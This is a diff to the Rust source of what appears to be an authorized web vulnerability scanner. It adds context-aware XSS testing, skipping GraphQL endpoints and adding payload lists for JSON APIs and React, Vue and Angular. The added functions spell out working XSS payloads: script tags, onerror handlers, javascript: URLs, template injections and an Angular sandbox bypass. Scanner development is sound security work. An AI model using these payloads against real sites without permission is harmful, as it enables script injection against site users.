@@ -14,7 +14,7 @@ use crate::http_client::HttpClient;
 use crate::payloads;
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::scanners::xss_detection::{InjectionContext, XssDetector};
-use crate::types::{ScanConfig, ScanMode, Severity, Confidence, Vulnerability};
+use crate::types::{ScanConfig, ScanMode, Severity, Confidence, Vulnerability, ScanContext, ParameterSource};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
 use serde_json::Value;
@@ -71,6 +71,7 @@ impl EnhancedXssScanner {
         base_url: &str,
         parameter: &str,
         config: &ScanConfig,
+        context: Option<&ScanContext>,
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // Mandatory authorization check
         if !crate::license::verify_scan_authorized() {
@@ -81,18 +82,34 @@ impl EnhancedXssScanner {
             return Ok((Vec::new(), 0));
         }
 
+        // Context-aware filtering - skip if context indicates XSS is not relevant
+        if let Some(ctx) = context {
+            if self.should_skip_based_on_context(ctx) {
+                debug!("[XSS] Skipping based on context: {:?}", ctx.parameter_source);
+                return Ok((Vec::new(), 0));
+            }
+        }
+
         // Smart parameter filtering - skip framework internals and numeric IDs
         if ParameterFilter::should_skip_parameter(parameter, ScannerType::XSS) {
             debug!("[XSS] Skipping framework/numeric parameter: {}", parameter);
             return Ok((Vec::new(), 0));
         }
 
-        info!("Testing parameter '{}' for XSS (enhanced, priority: {})",
+        info!("Testing parameter '{}' for XSS (enhanced, priority: {}, context: {})",
               parameter,
-              ParameterFilter::get_parameter_priority(parameter));
+              ParameterFilter::get_parameter_priority(parameter),
+              if context.is_some() { "aware" } else { "none" });
 
         let parameter_owned = parameter.to_string();
-        let payloads = payloads::get_xss_payloads(config.scan_mode.as_str());
+
+        // Get context-aware payloads
+        let payloads = if let Some(ctx) = context {
+            self.get_context_aware_payloads(config, ctx)
+        } else {
+            payloads::get_xss_payloads(config.scan_mode.as_str())
+        };
+
         let total_payloads = payloads.len();
 
         debug!("Testing {} XSS payloads with confirmation", total_payloads);
@@ -995,6 +1012,140 @@ impl EnhancedXssScanner {
         }
 
         false
+    }
+
+    /// Determine if XSS testing should be skipped based on context
+    fn should_skip_based_on_context(&self, context: &ScanContext) -> bool {
+        // Skip GraphQL endpoints - they use different injection patterns
+        if matches!(context.parameter_source, ParameterSource::GraphQL) {
+            info!("[XSS] Skipping GraphQL parameter - not relevant for traditional XSS");
+            return true;
+        }
+
+        // Skip if this is a GraphQL API
+        if context.is_graphql {
+            info!("[XSS] Skipping GraphQL API endpoint");
+            return true;
+        }
+
+        false
+    }
+
+    /// Get context-aware payloads based on scan context
+    fn get_context_aware_payloads(&self, config: &ScanConfig, context: &ScanContext) -> Vec<String> {
+        let base_payloads = payloads::get_xss_payloads(config.scan_mode.as_str());
+        let mut context_payloads = Vec::new();
+
+        // JSON API - use JSON-specific XSS payloads
+        if context.is_json_api {
+            debug!("[XSS] Using JSON-specific payloads");
+            context_payloads.extend(self.get_json_xss_payloads());
+        }
+
+        // Virtual DOM frameworks (React, Vue) - adjust payloads
+        if let Some(ref framework) = context.framework {
+            let fw = framework.to_lowercase();
+            if fw.contains("react") || fw.contains("vue") || fw.contains("angular") {
+                debug!("[XSS] Using virtual DOM payloads for framework: {}", framework);
+                context_payloads.extend(self.get_virtual_dom_payloads(framework));
+            }
+        }
+
+        // If we have context-specific payloads, combine with base set
+        if !context_payloads.is_empty() {
+            // Add context-specific payloads first (higher priority)
+            context_payloads.extend(base_payloads);
+            context_payloads
+        } else {
+            // No specific context adjustments needed
+            base_payloads
+        }
+    }
+
+    /// Get JSON-specific XSS payloads
+    fn get_json_xss_payloads(&self) -> Vec<String> {
+        vec![
+            // JSON injection that breaks out to XSS
+            r#"","xss":"<script>alert('json_xss')</script>"#.to_string(),
+            r#"\"<script>alert('json_escape')</script>"#.to_string(),
+
+            // JSON with HTML in value
+            r#"<img src=x onerror=alert('json_img')>"#.to_string(),
+
+            // Unicode escape in JSON
+            r#"\u003cscript\u003ealert('unicode')\u003c/script\u003e"#.to_string(),
+
+            // JSON MIME confusion
+            r#"</script><script>alert('json_mime')</script>"#.to_string(),
+
+            // Template injection in JSON context
+            r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),
+        ]
+    }
+
+    /// Get virtual DOM framework-specific payloads
+    fn get_virtual_dom_payloads(&self, framework: &str) -> Vec<String> {
+        let mut payloads = Vec::new();
+        let fw = framework.to_lowercase();
+
+        if fw.contains("react") {
+            // React-specific XSS vectors
+            payloads.extend(vec![
+                // dangerouslySetInnerHTML bypass
+                r#"<img src=x onerror=alert('react_xss')>"#.to_string(),
+
+                // JSX injection
+                r#"{alert('react_jsx')}"#.to_string(),
+
+                // href javascript: (still works in React)
+                r#"javascript:alert('react_href')"#.to_string(),
+
+                // React does auto-escape, so focus on attribute injection
+                r#"" onload="alert('react_attr')"#.to_string(),
+            ]);
+        }
+
+        if fw.contains("vue") {
+            // Vue-specific XSS vectors
+            payloads.extend(vec![
+                // Vue template injection
+                r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),
+
+                // v-html directive bypass
+                r#"<img src=x onerror=alert('vue_vhtml')>"#.to_string(),
+
+                // Vue expression injection
+                r#"{{_c.constructor('alert(1)')()}}"#.to_string(),
+
+                // Attribute binding injection
+                r#"' :onclick='alert(1)' '"#.to_string(),
+            ]);
+        }
+
+        if fw.contains("angular") {
+            // Angular-specific XSS vectors
+            payloads.extend(vec![
+                // Angular template expression
+                r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),
+
+                // Angular 1.x sandbox bypass
+                r#"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a','alert(1)'].sort(toString.constructor)}}"#.to_string(),
+
+                // Angular binding
+                r#"{{$on.constructor('alert(1)')()}}"#.to_string(),
+            ]);
+        }
+
+        // Common virtual DOM bypasses
+        payloads.extend(vec![
+            // SVG (works across frameworks)
+            r#"<svg/onload=alert('vdom_svg')>"#.to_string(),
+
+            // MathML (works across frameworks)
+            r#"<math><mtext><img src=x onerror=alert('vdom_math')></mtext></math>"#.to_string(),
+        ]);
+
+        payloads
     }
 
     /// Scan for Template Expression XSS
